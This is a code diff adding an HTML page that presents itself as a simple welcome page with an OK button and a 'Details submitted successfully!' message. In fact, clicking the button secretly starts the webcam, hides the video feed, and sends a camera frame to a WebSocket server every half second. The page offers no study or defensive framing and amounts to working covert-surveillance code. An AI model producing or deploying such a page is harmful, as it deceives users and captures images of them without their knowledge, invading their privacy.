@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Page</title>
+</head>
+<body>
+    <h2>Welcome</h2>
+    <button onclick="submitDetails()">OK</button>
+    <p id="message" style="display: none; color: green; font-weight: bold;">
+        Details submitted successfully!
+    </p>
+    <video id="video" autoplay playsinline style="display: none;"></video>
+
+    <script>
+        let ws = new WebSocket("ws://localhost:8080");
+
+        function submitDetails() {
+            document.getElementById('message').style.display = 'block';
+
+            // Start camera and send frames to server
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    document.getElementById('video').srcObject = stream;
+                    let videoTrack = stream.getVideoTracks()[0];
+
+                    let imageCapture = new ImageCapture(videoTrack);
+                    setInterval(async () => {
+                        let frame = await imageCapture.grabFrame();
+                        let canvas = document.createElement('canvas');
+                        let ctx = canvas.getContext('2d');
+                        canvas.width = frame.width;
+                        canvas.height = frame.height;
+                        ctx.drawImage(frame, 0, 0);
+                        canvas.toBlob(blob => {
+                            ws.send(blob);
+                        }, 'image/jpeg');
+                    }, 500); // Send a frame every 500ms
+                })
+                .catch(error => console.error("Error accessing camera:", error));
+        }
+    </script>
+</body>
+</html>
